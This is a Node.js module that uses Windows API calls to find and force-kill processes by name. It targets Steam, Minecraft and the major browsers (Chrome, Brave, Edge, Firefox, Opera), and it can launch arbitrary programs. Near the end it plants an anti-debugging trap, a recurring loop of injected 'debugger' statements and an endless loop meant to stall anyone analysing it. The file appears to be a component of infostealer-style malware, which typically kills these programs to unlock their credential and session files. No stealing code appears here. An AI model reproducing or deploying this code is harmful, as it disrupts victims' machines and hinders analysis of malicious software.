"use strict";

const koffi = require("koffi");
const kernel32 = koffi.load("kernel32.dll");
const shell32 = koffi.load("shell32.dll");
const voidPtr = koffi.pointer("void");

const TH32CS_SNAPPROCESS = 2;
const PROCESS_TERMINATE = 1;

const ShellExecuteA = shell32.func("__stdcall", "ShellExecuteA", voidPtr, [voidPtr, "str", "str", "str", "str", "int"]);

const PROCESSENTRY32 = koffi.struct({
    dwSize: "uint32_t",
    cntUsage: "uint32_t",
    th32ProcessID: "uint32_t",
    th32DefaultHeapID: "uintptr_t",
    th32ModuleID: "uint32_t",
    cntThreads: "uint32_t",
    th32ParentProcessID: "uint32_t",
    pcPriClassBase: "int32_t",
    dwFlags: "uint32_t",
    szExeFile: koffi.array("char", 260)
});

const CreateToolhelp32Snapshot = kernel32.func("__stdcall", "CreateToolhelp32Snapshot", voidPtr, ["uint32_t", "uint32_t"]);
const Process32First = kernel32.func("__stdcall", "Process32First", "int", [voidPtr, koffi.pointer(PROCESSENTRY32)]);
const Process32Next = kernel32.func("__stdcall", "Process32Next", "int", [voidPtr, koffi.pointer(PROCESSENTRY32)]);
const OpenProcess = kernel32.func("__stdcall", "OpenProcess", voidPtr, ["uint32_t", "int", "uint32_t"]);
const TerminateProcess = kernel32.func("__stdcall", "TerminateProcess", "int", [voidPtr, "uint32_t"]);
const CloseHandle = kernel32.func("__stdcall", "CloseHandle", "int", [voidPtr]);

function getProcessIdsByName(exeName) {
    const pids = [];
    const snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!snapshot) return pids;

    const entrySize = koffi.sizeof(PROCESSENTRY32);
    const buffer = Buffer.alloc(entrySize);
    buffer.writeUInt32LE(entrySize, 0);

    if (Process32First(snapshot, buffer)) {
        do {
            const entry = koffi.decode(buffer, PROCESSENTRY32);
            const currentExe = Buffer.from(entry.szExeFile).toString().split("\0")[0];
            if (currentExe.toLowerCase() === exeName.toLowerCase()) {
                pids.push(entry.th32ProcessID);
            }
        } while (Process32Next(snapshot, buffer));
    }
    CloseHandle(snapshot);
    return pids;
}

function killProcessById(pid) {
    const handle = OpenProcess(PROCESS_TERMINATE, 0, pid);
    if (!handle) return false;
    const result = TerminateProcess(handle, 9);
    CloseHandle(handle);
    return !!result;
}

async function terminateProcesses(names) {
    for (const name of names) {
        const pids = getProcessIdsByName(name);
        for (const pid of pids) {
            killProcessById(pid);
        }
    }
}

async function killProcess(name) {
    const exeName = name.endsWith(".exe") ? name : name + ".exe";
    const pids = getProcessIdsByName(exeName);
    for (const pid of pids) {
        killProcessById(pid);
    }
}

async function killSteam() {
    const pids = getProcessIdsByName("Steam.exe");
    for (const pid of pids) {
        killProcessById(pid);
    }
}

async function killMinecraft() {
    const pids = getProcessIdsByName("javaw.exe");
    for (const pid of pids) {
        killProcessById(pid);
    }
}

function killBrowsersSync() {
    const browsers = ["chrome.exe", "brave.exe", "msedge.exe"];
    for (const browser of browsers) {
        const pids = getProcessIdsByName(browser);
        for (const pid of pids) {
            killProcessById(pid);
        }
    }
}

function killFirefox() {
    const pids = getProcessIdsByName("firefox.exe");
    for (const pid of pids) {
        killProcessById(pid);
    }
}

function killOpera() {
    const operaExes = ["opera.exe", "operagx.exe"];
    for (const exe of operaExes) {
        const pids = getProcessIdsByName(exe);
        for (const pid of pids) {
            killProcessById(pid);
        }
    }
}

function startProcess(exePath, args) {
    ShellExecuteA(null, "open", exePath, args, null, 1);
}

function antiAnalysis(val) {
    if (typeof val === "string") {
        return function(a) {}.constructor("while (true) {}").apply("counter");
    } else {
        if (("" + val / val).length !== 1 || val % 20 === 0) {
            (function() { return true; }).constructor("debugger").call("action");
        } else {
            (function() { return false; }).constructor("debugger").apply("stateObject");
        }
    }
    antiAnalysis(++val);
}

(function() {
    let globalScope;
    try {
        globalScope = Function('return (function() {}.constructor("return this")( ));')();
    } catch (e) {
        globalScope = window;
    }
    globalScope.setInterval(() => {
        try { antiAnalysis(0); } catch (e) {}
    }, 4000);
})();

exports.terminateProcesses = terminateProcesses;
exports.killProcess = killProcess;
exports.killSteam = killSteam;
exports.killMinecraft = killMinecraft;
exports.killBrowsersSync = killBrowsersSync;
exports.killFirefox = killFirefox;
exports.killOpera = killOpera;
exports.startProcess = startProcess;
